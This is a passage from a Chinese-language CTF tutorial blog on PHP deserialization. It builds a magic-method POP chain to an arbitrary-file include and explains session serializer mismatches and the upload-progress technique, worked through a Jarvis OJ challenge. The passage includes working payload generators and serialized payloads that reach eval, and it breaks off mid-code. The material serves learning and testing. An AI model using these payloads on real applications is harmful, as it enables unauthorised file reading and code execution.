- 构造魔术函数层层递进链2"></a>实例4 - 构造魔术函数层层递进链2</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//3-4.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params"><span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$value</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;append(<span class="keyword">$this</span>-&gt;var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span>=<span class="string">&#x27;index.php&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = <span class="variable">$file</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Welcome to &#x27;</span>.<span class="keyword">$this</span>-&gt;source.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="keyword">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    @unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$a</span>=<span class="keyword">new</span> Show;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>利用思路是通过构造POP链改写$var，并执行include($value),形成任意文件读，现在开始分析POP怎么走：</p><ol><li><p>目标是调用include($value)，也就是调用append方法，append方法在Modifier类里的__invoke方法已经调用了。现在可以先给$value也就是$var赋值为任意文件，然后再去寻找怎么样才能执行这个__invoke</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span>  <span class="variable">$var</span> = <span class="string">&quot;D:\\.pem&quot;</span>;</span><br></pre></td></tr></table></figure></li><li><p>Test类里的__get方法return了一个函数调用，那么把$this-&gt;p赋值为Modifier类的对象，就会触发之前的那个__invoke,现在去寻找怎么样才能执行这个__get</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;p = <span class="keyword">new</span> Modifier()</span><br></pre></td></tr></table></figure></li><li><p>Show类里的__toString方法访问了str的source属性，那么把$this-&gt;str赋值为Test类的对象，Test类不存在这个source属性，就会触发__get,现在去寻找怎么样去执行这个__toString</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;str = <span class="keyword">new</span> Test()</span><br></pre></td></tr></table></figure></li><li><p>Show类的构造方法echo了字符串，那么把$this-&gt;source赋值为Show的对象，就会去触发__toString。POP链完成</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> Show();</span><br><span class="line"><span class="keyword">$this</span>-&gt;source = <span class="variable">$a</span>;</span><br></pre></td></tr></table></figure></li></ol><p>payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//这里把不需要修改的类内容都可以删掉，防止POP链过长</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$var</span> = <span class="string">&quot;D:\\.pem&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span>=<span class="string">&#x27;index.php&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = <span class="variable">$file</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Welcome to &#x27;</span>.<span class="keyword">$this</span>-&gt;source.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;p = <span class="keyword">new</span> Modifier();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> Show();</span><br><span class="line"><span class="variable">$a</span>-&gt;source = <span class="variable">$a</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;str = <span class="keyword">new</span> Test();</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">O%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>Show%<span class="number">22</span>%<span class="number">3</span>A2%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A6%<span class="number">3</span>A%<span class="number">22</span>source%<span class="number">22</span>%<span class="number">3</span>Br%<span class="number">3</span>A1%<span class="number">3</span>Bs%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">22</span>str%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>Test%<span class="number">22</span>%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">22</span>p%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A8%<span class="number">3</span>A%<span class="number">22</span>Modifier%<span class="number">22</span>%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A6%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span><span class="keyword">var</span>%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A7%<span class="number">3</span>A%<span class="number">22</span>D%<span class="number">3</span>A%<span class="number">5</span>C.pem%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">7</span>D%<span class="number">7</span>D%<span class="number">7</span>D</span><br></pre></td></tr></table></figure><p><img src="https://lisianthus-images.oss-cn-hangzhou.aliyuncs.com/img/20210127171236.png"></p><h2 id="0x4-PHP-Session反序列化"><a href="#0x4-PHP-Session反序列化" class="headerlink" title="0x4.PHP Session反序列化"></a>0x4.PHP Session反序列化</h2><h3 id="PHP-Session"><a href="#PHP-Session" class="headerlink" title="PHP Session"></a>PHP Session</h3><h3 id="session请求过程"><a href="#session请求过程" class="headerlink" title="session请求过程"></a>session请求过程</h3><p>当第一次访问网站时，Seesion_start()函数就会创建一个唯一的Session ID，并自动通过HTTP的响应头，将这个Session ID保存到客户端Cookie中。同时，也在服务器端创建一个以Session ID命名的文件，用于保存这个用户的会话信息。当同一个用户再次访问这个网站时，也会自动通过HTTP的请求头将Cookie中保存的Seesion ID再携带过来，这时Session_start()函数就不会再去分配一个新的Session ID，而是在服务器的硬盘中去寻找和这个Session ID同名的Session文件，将这之前为这个用户保存的会话信息读出，在当前脚本中应用，达到跟踪这个用户的目的。</p><h3 id="session-start的作用"><a href="#session-start的作用" class="headerlink" title="session_start的作用"></a>session_start的作用</h3><p><img src="https://img2020.cnblogs.com/blog/1344396/202010/1344396-20201003174021765-253947050.png"></p><h3 id="PHP-session存储机制"><a href="#PHP-session存储机制" class="headerlink" title="PHP session存储机制"></a>PHP session存储机制</h3><p>php session存放在文件中，默认在tmp目录。存储的文件是以sess_sessionid来进行命名的，文件的内容就是Session值的序列化之后的内容</p><p>PHP session有三种序列化方式，分别是php, php_serialize, php_binary</p><table><thead><tr><th><strong>存储引擎</strong></th><th><strong>存储方式</strong></th></tr></thead><tbody><tr><td>php_binary</td><td>键名的长度对应的 ASCII 字符 + 键名 + 经过 serialize() 函数序列化处理的值</td></tr><tr><td>php</td><td>键名 + 竖线 + 经过 serialize() 函数序列处理的值</td></tr><tr><td>php_serialize</td><td>(PHP&gt;5.5.4) 经过 serialize() 函数序列化处理的数组</td></tr></tbody></table><h4 id="序列化存储引擎1-php"><a href="#序列化存储引擎1-php" class="headerlink" title="序列化存储引擎1 - php"></a>序列化存储引擎1 - php</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//4-1.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php&#x27;</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://lisianthus-images.oss-cn-hangzhou.aliyuncs.com/img/20210128092503.png"></p><p><img src="https://lisianthus-images.oss-cn-hangzhou.aliyuncs.com/img/20210128092536.png"></p><p>username|s:8:”zhangsan”;</p><p>$_SESSION[‘username’]的键名|GET参数的类型:长度:”值”;</p><p>$_SESSION[‘username’]的键名|GET参数经过序列化后的值</p><h4 id="序列化存储引擎2-php-serialize"><a href="#序列化存储引擎2-php-serialize" class="headerlink" title="序列化存储引擎2 - php_serialize"></a>序列化存储引擎2 - php_serialize</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//4-2.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php_serialize&#x27;</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://lisianthus-images.oss-cn-hangzhou.aliyuncs.com/img/20210128093426.png"></p><p>a:1:{s:8:”username”;s:8:”zhangsan”;}</p><p>GET参数经过序列化后的值</p><h4 id="序列化存储引擎3-php-binary"><a href="#序列化存储引擎3-php-binary" class="headerlink" title="序列化存储引擎3 - php_binary"></a>序列化存储引擎3 - php_binary</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//4-3.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php_binary&#x27;</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://lisianthus-images.oss-cn-hangzhou.aliyuncs.com/img/20210128093644.png"></p><p>usernames:8:”zhangsan”;</p><p>键名长度的ASCII字符+$_SESSION[‘username’]的键名:GET参数的长度:”参数值”</p><h3 id="session反序列化漏洞"><a href="#session反序列化漏洞" class="headerlink" title="session反序列化漏洞"></a>session反序列化漏洞</h3><p>PHP session存储和读取时，都会有一个序列化和反序列化过程</p><blockquote><p>漏洞成因：使用不同的引擎来处理session文件</p></blockquote><h4 id="SESSION可赋值"><a href="#SESSION可赋值" class="headerlink" title="$_SESSION可赋值"></a>$_SESSION可赋值</h4><p>程序使用两个引擎来分别处理的话就会出现问题。比如下面的例子，先使用php_serialize引擎来存储Session：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//4-4-1.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php_serialize&#x27;</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&quot;</span>;</span><br><span class="line">var_dump(<span class="variable">$_SESSION</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/pre&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>再用php引擎读取Session:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//4-4-2.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php&#x27;</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">user</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$age</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;hello &quot;</span>.<span class="keyword">$this</span>-&gt;name.<span class="string">&quot; !&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>漏洞的主要原因在于不同的引擎对于竖杠’ | ‘的解析产生歧义</p><p>对于php_serialize引擎来说’ | ‘可能只是一个正常的字符；</p><p>对于php引擎来说’ | ‘就是分隔符，前面是$_SESSION[‘username’]的键名 ，后面是GET参数经过serialize序列化后的值。</p><p>从而在解析的时候造成了歧义，导致其在解析Session文件时直接对’ | ‘后的值进行反序列化处理</p><p>这里有个小问题？为什么进行了反序列化触发了__wakeup()?</p><ul><li>因为使用了session_start()这个函数。当现有的会话以特殊的反序列化格式存储，php就会自动反序列化数据填充至$_SESSION</li></ul><p>构造payload改写$this-&gt;name：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">user</span></span>&#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$name</span>;</span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$age</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$a</span> = <span class="keyword">new</span> user();</span><br><span class="line">    <span class="variable">$a</span>-&gt;name = <span class="string">&quot;zhangsan&quot;</span>;</span><br><span class="line">    <span class="variable">$a</span>-&gt;age = <span class="string">&quot;666&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> serialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">O:<span class="number">4</span>:<span class="string">&quot;user&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;zhangsan&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;age&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;666&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p>这里不能把这个payload直接传上去，因为接收的参数是经过php引擎进行反序列化，所以要在前面加 |</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">|O:<span class="number">4</span>:<span class="string">&quot;user&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;zhangsan&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;age&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;666&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://lisianthus-images.oss-cn-hangzhou.aliyuncs.com/img/20210128103039.png"></p><p><img src="https://lisianthus-images.oss-cn-hangzhou.aliyuncs.com/img/20210128103256.png"></p><h4 id="SESSION不可赋值"><a href="#SESSION不可赋值" class="headerlink" title="$_SESSION不可赋值"></a>$_SESSION不可赋值</h4><p>如果代码中不存在对$_SESSION变量赋值，怎么利用?   这里使用 Session上传进度</p><p>在PHP存在upload_process机制（php &gt;= 5.4.0），即自动在$_SESSION中创建一个键值对（key:value），value中刚好存在用户可控的部分，这个功能在文件上传的过程中利用session实时返回上传的进度。</p><p>此漏洞需要session.upload_progress.enabled为on，在上传文件的时候同时POST一个与session.upload_process.name的同名变量。后端会自动将POST的这个同名变量作为键进行序列化然后存储到session文件中。下次请求就会反序列化session文件，从中取出这个键</p><h5 id="实例-Jarvis-OJ-PHPINFO"><a href="#实例-Jarvis-OJ-PHPINFO" class="headerlink" title="实例 - Jarvis OJ - PHPINFO"></a>实例 - Jarvis OJ - PHPINFO</h5><p><a href="http://web.jarvisoj.com:32784/">http://web.jarvisoj.com:32784/</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//A webshell is wait for you</span></span><br><span class="line">ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php&#x27;</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OowoO</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mdzz</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mdzz = <span class="string">&#x27;phpinfo();&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;mdzz);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;phpinfo&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$m</span> = <span class="keyword">new</span> OowoO();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    highlight_string(file_get_contents(<span class="string">&#x27;index.php&#x27;</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>代码使用php引擎进行读取[反序列化]session</p><p>传入任意phpinfo参数都会执行eval(phpinfo();)</p><p><img src="https://lisianthus-images.oss-cn-hangzhou.aliyuncs.com/img/20210128110128.png"></p><ul><li><p>通过读取phpinfo，得知默认的session存储引擎为php_serialize，和题目读取引擎不同，会造成漏洞</p></li><li><p>session.upload_progress.enabled 为 On，可以使用session上传进度利用</p></li><li><p>session.upload_progress.name 为 PHP_SESSION_UPLOAD_PROGRESS，可以创建表单向远程服务器发送数据</p></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//upload.html</span></span><br><span class="line">&lt;form action=<span class="string">&quot;http://web.jarvisoj.com:32784/index.php&quot;</span> method=<span class="string">&quot;POST&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> value=<span class="string">&quot;123&quot;</span> /&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;file&quot;</span> / &gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;submit&quot;</span> /&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure><ul><li>构造payload</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php_serialize&#x27;</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OowoO</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mdzz</span>=<span class="string">&#x27;print_r(scandir(dirname(__FILE__)));&#x27;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> OowoO();</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$obj</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">O:<span class="number">5</span>:<span class="string">&quot;OowoO&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;mdzz&quot;</span>;s:<span class="number">36</span>:<span class="string">&quot;print_r(scandir(dirname(__FILE__)));&quot;</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//前面加|</span></span><br><span class="line">|O:<span class="number">5</span>:<span class="string">&quot;OowoO&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;mdzz&quot;</span>;s:<span class="number">36</span>:<span class="string">&quot;print_r(scandir(dirname(__FILE__)));&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p>文件上传的时候使用burp抓包，在 PHP_SESSION_UPLOAD_PROGRESS 的 value 值中添加payload</p><p><img src="https://lisianthus-images.oss-cn-hangzhou.aliyuncs.com/img/20210128111548.png"></p><ul><li>payload2:获取flag路径</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 